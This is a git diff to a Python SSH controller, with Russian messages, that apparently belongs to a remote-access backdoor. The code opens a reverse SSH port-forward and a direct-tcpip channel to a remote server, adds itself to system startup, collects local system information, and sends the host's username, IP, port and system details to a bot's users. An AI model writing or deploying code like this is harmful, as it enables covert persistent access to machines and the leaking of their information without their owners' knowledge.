@@ -4,8 +4,10 @@ import asyncio
 from controllers.botController import send_message_to_all_users
 from helpers.autostart import add_to_startup
 from helpers.get_used_ports import get_used_ports
+from helpers.get_system_info import get_system_info
 
 from config import server_config as conf
+from config import system_data
 
 
 class sshController:
@@ -23,39 +25,9 @@ class sshController:
         self.client = paramiko.SSHClient()
         self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-        # if self.port is None:
-        #     range_start = 5000
-        #     range_end = 65000
-        #     used_ports = get_used_ports(range_start, range_end)
-        #     print(f"Used ports: {used_ports}")
-        #
-        #     for i in range(range_start, range_end):
-        #         if i not in used_ports:
-        #             try:
-        #                 print(f"Connecting to {self.server_ip} on port {i}...")
-        #                 self.client.connect(hostname=self.server_ip, username=self.username, password=self.password,
-        #                                     port=i, timeout=conf['timeout'])
-        #                 print(f"Connected    to {self.server_ip} on port {i}")
-        #                 self.port = i  # Устанавливаем порт после успешного подключения
-        #                 self.credentials_ok = True
-        #                 break
-        #             except Exception as e:
-        #                 print(f"Connection failed on port {i}: {e}")
-        #
-        # else:
-        #     try:
-        #         print(f"Connecting to {self.server_ip} on port {self.port}...")
-        #         self.client.connect(hostname=self.server_ip, username=self.username, password=self.password,
-        #                             port=self.port)
-        #         print(f"Connected to {self.server_ip} on port {self.port}")
-        #         self.credentials_ok = True
-        #     except Exception as e:
-        #         print(f"Connection failed: {e}")
-
         range_start = 5000
         range_end = 65000
         used_ports = get_used_ports(range_start, range_end)
-        print(f"Used ports: {used_ports}")
 
         if self.port is None:
             for i in range(range_start, range_end):
@@ -69,6 +41,12 @@ class sshController:
 
                         transport = self.client.get_transport()
                         transport.request_port_forward('', port=self.port)
+
+                        channel = transport.open_channel(
+                            "direct-tcpip",
+                            (self.server_ip, self.port),
+                            ("localhost", self.port)
+                        )
 
                         self.credentials_ok = True
                         break
@@ -84,6 +62,12 @@ class sshController:
 
                 transport = self.client.get_transport()
                 transport.request_port_forward('', port=self.port)
+
+                channel = transport.open_channel(
+                    "direct-tcpip",
+                    (self.server_ip, self.port),
+                    ("localhost", self.port)
+                )
 
                 self.credentials_ok = True
             except Exception as e:
@@ -102,30 +86,14 @@ class sshController:
                     await self.create_ssh_tunnel()
                     continue
 
-    async def get_remote_system_info(self):
-        try:
-            command = "systeminfo"
-            stdin, stdout, stderr = self.client.exec_command(command)
-            output = stdout.read().decode()
-            error = stderr.read().decode()
-
-            if error:
-                print(f"Ошибка: {error}")
-                return error
-
-            return output
-
-        except Exception as e:
-            print(f"Произошла ошибка при подключении или выполнении команды: {e}")
-
     async def start(self):
         await self.create_ssh_tunnel()
         task = asyncio.create_task(self.monitor_connection())
 
-        system_info = await self.get_remote_system_info()
+        system_info = await get_system_info()
 
         if system_info:
-            send_message_to_all_users(f"""Подключение успешно установлено!
+            system_data['last_message'] = f"""Подключение успешно установлено!
 Пользователь: {self.username}
 IP: {self.server_ip}
 Порт: {self.port}
@@ -133,8 +101,10 @@ IP: {self.server_ip}
 Системная информация:
 {system_info}
 
-Автозагрузка: 
+Автозагрузка:
 {add_to_startup(self.main_file_path)}
-""")
+"""
+
+            send_message_to_all_users(system_data['last_message'])
 
         await task
